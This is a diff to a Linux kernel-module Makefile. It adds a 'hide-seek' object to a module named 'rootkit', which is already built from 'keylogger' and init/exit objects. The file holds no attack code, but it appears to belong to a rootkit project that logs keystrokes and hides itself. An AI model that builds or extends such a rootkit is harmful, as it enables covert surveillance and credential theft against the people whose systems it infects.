@@ -1,6 +1,6 @@
 # List of modules to build
 obj-m += rootkit.o
-rootkit-objs := keylogger.o init-exit.o
+rootkit-objs := keylogger.o init-exit.o hide-seek.o
 
 # Kernel build directory
 KDIR := /lib/modules/$(shell uname -r)/build
